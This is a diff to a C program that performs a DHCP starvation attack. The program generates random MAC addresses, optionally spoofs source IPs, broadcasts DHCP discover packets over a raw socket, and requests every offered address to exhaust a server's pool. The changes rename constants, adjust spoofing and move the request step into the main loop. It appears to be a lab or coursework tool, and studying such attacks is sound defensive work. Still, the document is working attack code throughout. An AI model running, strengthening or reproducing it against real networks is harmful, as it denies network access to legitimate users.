@@ -41,10 +41,11 @@ struct DHCP_packet {
 typedef struct DHCP_packet DHCP_packet;
 
 #define BOOT_REQUEST 1
+#define BOOT_REPLY 2
 
 #define DHCP_DISCOVER 1
-#define DHCP_OFFER    2
 #define DHCP_REQUEST  3
+// #define DHCP_OFFER    2
 // #define DHCP_ACK      5
 // #define DHCP_NACK     6
 
@@ -57,8 +58,8 @@ typedef struct DHCP_packet DHCP_packet;
 #define SERVER_PORT 67
 #define CLIENT_PORT 68
 
-#define HTYPE 1
-#define HLEN  6
+#define H_TYPE 1
+#define H_LEN  6
 
 #define PACKET_LEN 8192
 
@@ -89,7 +90,7 @@ in_addr_t spoof_random_ip() {
 
     struct in_addr address;
     address.s_addr = ip;
-    printf("RANDOM IP ADDRESS : %s\n", inet_ntoa(address));
+    printf("RANDOM IP ADDRESS: %s\n", inet_ntoa(address));
 
     return ip;
 }
@@ -194,9 +195,6 @@ int send_packet(void *data, int data_len, int sock, in_addr_t src_ip, struct soc
 
     int result = (int)sendto(sock, buffer, ip->tot_len, 0, (struct sockaddr *)dest, sizeof(*dest));
 
-    if (DEBUG) {
-        printf("send_packet result: %d\n", result);
-    }
     if (result < 0) {
         return FAILURE;
     }
@@ -215,7 +213,6 @@ int receive_packet(void *data, size_t data_len, int sock, struct sockaddr_in *so
 
     select(sock + 1, &read_fds, NULL, NULL, &time_val);
 
-    /* make sure some data has arrived */
     if (!FD_ISSET(sock, &read_fds)) {
         if (DEBUG) {
             printf("No (more) data received\n");
@@ -244,16 +241,16 @@ int receive_packet(void *data, size_t data_len, int sock, struct sockaddr_in *so
 }
 
 int make_random_hardware_address() {
-    for (int i = 0; i < HLEN; i++) {
+    for (int i = 0; i < H_LEN; i++) {
         random_mac[i] = rand() % 0x100; // NOLINT(cert-msc50-cpp)
     }
 
     printf("RANDOM MAC ADDRESS: ");
-    for (int i = 0; i < HLEN; i++) {
+    for (int i = 0; i < H_LEN; i++) {
         if (i > 0) {
             printf(":");
         }
-        printf("%x", random_mac[i]);
+        printf("%02x", random_mac[i]);
     }
     puts("");
 
@@ -281,15 +278,15 @@ int send_DHCP_discover_packet(int sock) {
     bzero(&discover_packet, sizeof(discover_packet));
 
     discover_packet.op = BOOT_REQUEST;
-    discover_packet.htype = HTYPE;
-    discover_packet.hlen = HLEN;
+    discover_packet.htype = H_TYPE;
+    discover_packet.hlen = H_LEN;
     discover_packet.hops = 0;
 
     transaction_id = random();
     discover_packet.xid = htonl(transaction_id);
     discover_packet.secs = htons(0x00);
     discover_packet.flags = htons(BROADCAST_FLAG);
-    memcpy(discover_packet.chaddr, random_mac, HLEN);
+    memcpy(discover_packet.chaddr, random_mac, H_LEN);
 
     int i = set_magic_cookie(&discover_packet);
 
@@ -298,12 +295,11 @@ int send_DHCP_discover_packet(int sock) {
 
     discover_packet.options[i] = '\xFF';
 
-    spoofed_ip = spoof_random_ip();
+    // spoofed_ip = spoof_random_ip();
+    spoofed_ip = INADDR_ANY;
     struct sockaddr_in broadcast_address = get_address(SERVER_PORT, INADDR_BROADCAST);
     while (send_packet(&discover_packet, sizeof(discover_packet), sock, spoofed_ip, &broadcast_address) == FAILURE) {
-        if (DEBUG) {
-            printf("Error in sending packet... resending the packet\n");
-        }
+        printf("Error in sending packet... resending the packet\n");
     }
 
     return SUCCESS;
@@ -314,8 +310,8 @@ int send_DHCP_request_packet(int sock, struct in_addr server_ip) {
     memset(&request_packet, 0, sizeof(request_packet));
 
     request_packet.op = BOOT_REQUEST;
-    request_packet.htype = HTYPE;
-    request_packet.hlen = HLEN;
+    request_packet.htype = H_TYPE;
+    request_packet.hlen = H_LEN;
     request_packet.hops = 0;
 
     request_packet.xid = htonl(transaction_id);
@@ -325,7 +321,7 @@ int send_DHCP_request_packet(int sock, struct in_addr server_ip) {
     request_packet.ciaddr = offered_address;
     request_packet.siaddr = server_ip;
 
-    memcpy(request_packet.chaddr, random_mac, HLEN);
+    memcpy(request_packet.chaddr, random_mac, H_LEN);
 
     int i = set_magic_cookie(&request_packet);
 
@@ -340,32 +336,29 @@ int send_DHCP_request_packet(int sock, struct in_addr server_ip) {
 
     struct sockaddr_in broadcast_address = get_address(SERVER_PORT, INADDR_BROADCAST);
     while (send_packet(&request_packet, sizeof(request_packet), sock, spoofed_ip, &broadcast_address) == FAILURE) {
-        if (DEBUG) {
-            printf("Error in sending packet... resending the packet\n");
-        }
+        printf("Error in sending packet... resending the packet\n");
     }
 
     return SUCCESS;
 }
 
-int get_DHCP_offer_packet(int sock) {
+int get_DHCP_offer_packet(int sock, struct sockaddr_in *source) {
     for (time_t start = time(NULL), cur = start; (cur - start) <= timeout; cur = time(NULL)) {
 
         DHCP_packet offer_packet;
-        struct sockaddr_in source;
 
-        int result = receive_packet(&offer_packet, sizeof(offer_packet), sock, &source, timeout);
+        int result = receive_packet(&offer_packet, sizeof(offer_packet), sock, source, timeout);
 
         if (result == FAILURE) {
             return FAILURE;
         }
 
-        if (offer_packet.op != DHCP_OFFER) {
+        if (offer_packet.op != BOOT_REPLY) {
             continue;
         }
 
         if (DEBUG) {
-            printf("DHCP_OFFER from IP address %s\n", inet_ntoa(source.sin_addr));
+            printf("DHCP_OFFER from IP address %s\n", inet_ntoa(source->sin_addr));
             printf("DHCP_OFFER XID: %u (0x%X)\n", ntohl(offer_packet.xid), ntohl(offer_packet.xid));
         }
 
@@ -378,20 +371,9 @@ int get_DHCP_offer_packet(int sock) {
             continue;
         }
 
-        /* check hardware address */
-        if (DEBUG) {
-            printf("DHCP_OFFER chaddr: ");
-        }
-
         result = SUCCESS;
-        for (int x = 0; x < HLEN; x++) {
-            if (DEBUG) {
-                printf("%02X", (unsigned char)offer_packet.chaddr[x]);
-            }
+        for (int x = 0; x < H_LEN; x++) {
             if (offer_packet.chaddr[x] != random_mac[x]) {
-                if (DEBUG) {
-                    printf("DHCP_OFFER hardware address did not match our own - ignoring packet\n");
-                }
                 result = FAILURE;
                 break;
             }
@@ -401,15 +383,18 @@ int get_DHCP_offer_packet(int sock) {
             continue;
         }
 
-        printf("OFFERED ADDRESS:    %s\n", inet_ntoa(offer_packet.yiaddr));
+        printf("OFFERED    ADDRESS: %s\n", inet_ntoa(offer_packet.yiaddr));
         offered_address = offer_packet.yiaddr;
-
-        send_DHCP_request_packet(sock, source.sin_addr);
 
         return SUCCESS;
     }
 
     return FAILURE;
+}
+
+void hr() {
+    puts("----------");
+    fflush(stdout);
 }
 
 int main(int argc, char *argv[]) {
@@ -426,13 +411,17 @@ int main(int argc, char *argv[]) {
     DEBUG = 0;
     puts("DHCP Starvation is starting");
 
+    struct sockaddr_in source;
+
     int sock = create_socket(interface_name);
     for (int i = 0; i < 15; i++) {
         make_random_hardware_address();
         send_DHCP_discover_packet(sock);
         fflush(stdout);
-        get_DHCP_offer_packet(sock);
-        fflush(stdout);
+        if (get_DHCP_offer_packet(sock, &source) == SUCCESS) {
+            send_DHCP_request_packet(sock, source.sin_addr);
+        }
+        hr();
     }
 
     close(sock);
